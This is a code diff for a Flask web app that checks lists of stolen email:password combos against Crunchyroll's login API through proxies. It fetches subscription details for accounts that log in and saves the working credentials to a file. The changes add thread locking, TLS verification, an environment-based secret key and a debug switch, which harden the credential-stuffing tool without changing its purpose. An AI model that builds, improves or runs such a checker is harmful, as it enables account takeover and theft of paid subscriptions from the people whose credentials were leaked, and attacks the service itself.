@@ -19,7 +19,7 @@ from queue import Queue
 app = Flask(__name__)
 app.config['UPLOAD_FOLDER'] = 'uploads'
 app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max file size
-app.config['SECRET_KEY'] = 'your-secret-key-here'
+app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', os.urandom(24).hex())
 
 # Ensure upload directory exists
 os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
@@ -54,6 +54,7 @@ class CrunchyrollCredentialChecker:
         self.current_index = 0
         self.start_time = None
         self.valid_file = "valid_credentials.txt"
+        self.lock = threading.Lock()  # Thread synchronization lock
         
     def load_credentials(self):
         """Load credentials from combo file"""
@@ -110,8 +111,9 @@ class CrunchyrollCredentialChecker:
         try:
             email, password = credential.split(':', 1)
         except ValueError:
-            self.invalid_count += 1
-            self.current_index += 1
+            with self.lock:
+                self.invalid_count += 1
+                self.current_index += 1
             return
         
         max_retries = 3
@@ -141,7 +143,8 @@ class CrunchyrollCredentialChecker:
                     headers=headers,
                     data=data,
                     proxies=proxies,
-                    timeout=10
+                    timeout=10,
+                    verify=True
                 )
                 
                 if response.status_code == 200:
@@ -151,12 +154,14 @@ class CrunchyrollCredentialChecker:
                         # Get subscription info
                         subscription_info = self.get_subscription_info(result['access_token'], headers, proxies)
                         
-                        self.valid_count += 1
-                        self.current_index += 1
+                        with self.lock:
+                            self.valid_count += 1
+                            self.current_index += 1
                         
-                        # Save valid credential
-                        with open(self.valid_file, 'a', encoding='utf-8') as f:
-                            f.write(f"{credential} | {subscription_info}\n")
+                        # Save valid credential (thread-safe file write)
+                        with self.lock:
+                            with open(self.valid_file, 'a', encoding='utf-8') as f:
+                                f.write(f"{credential} | {subscription_info}\n")
                         
                         self.log_status(
                             f"✅ VALID: {email} | {subscription_info}",
@@ -165,8 +170,9 @@ class CrunchyrollCredentialChecker:
                         return
                 
                 # Invalid credential
-                self.invalid_count += 1
-                self.current_index += 1
+                with self.lock:
+                    self.invalid_count += 1
+                    self.current_index += 1
                 self.log_status(f"❌ INVALID: {email}", "invalid")
                 return
                 
@@ -175,8 +181,9 @@ class CrunchyrollCredentialChecker:
                     time.sleep(1)
                     continue
                 else:
-                    self.invalid_count += 1
-                    self.current_index += 1
+                    with self.lock:
+                        self.invalid_count += 1
+                        self.current_index += 1
                     self.log_status(f"⚠️ ERROR: {email} - {str(e)}", "error")
                     return
     
@@ -189,7 +196,8 @@ class CrunchyrollCredentialChecker:
                 'https://beta-api.crunchyroll.com/subs/v1/subscriptions',
                 headers=headers,
                 proxies=proxies,
-                timeout=10
+                timeout=10,
+                verify=True
             )
             
             if response.status_code == 200:
@@ -229,7 +237,8 @@ class CrunchyrollCredentialChecker:
         self.current_index = 0
         
         # Clear valid file
-        open(self.valid_file, 'w').close()
+        with open(self.valid_file, 'w') as f:
+            pass
         
         # Load credentials and proxies
         if not self.load_credentials():
@@ -260,18 +269,19 @@ class CrunchyrollCredentialChecker:
     
     def get_stats(self):
         """Get current statistics"""
-        elapsed_time = time.time() - self.start_time if self.start_time else 0
-        speed = self.current_index / elapsed_time if elapsed_time > 0 else 0
-        
-        return {
-            'total': self.total_count,
-            'current': self.current_index,
-            'valid': self.valid_count,
-            'invalid': self.invalid_count,
-            'speed': round(speed, 2),
-            'elapsed': round(elapsed_time, 2),
-            'is_running': self.is_running
-        }
+        with self.lock:
+            elapsed_time = time.time() - self.start_time if self.start_time else 0
+            speed = self.current_index / elapsed_time if elapsed_time > 0 else 0
+            
+            return {
+                'total': self.total_count,
+                'current': self.current_index,
+                'valid': self.valid_count,
+                'invalid': self.invalid_count,
+                'speed': round(speed, 2),
+                'elapsed': round(elapsed_time, 2),
+                'is_running': self.is_running
+            }
 
 
 @app.route('/')
@@ -408,4 +418,6 @@ if __name__ == '__main__':
     print("📱 Access on mobile: http://<your-ip>:5000")
     print("💻 Access on desktop: http://localhost:5000")
     print("=" * 60)
-    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)
+    # Use debug=False for production, True only for development
+    debug_mode = os.environ.get('FLASK_DEBUG', 'False').lower() == 'true'
+    app.run(host='0.0.0.0', port=5000, debug=debug_mode, threaded=True)
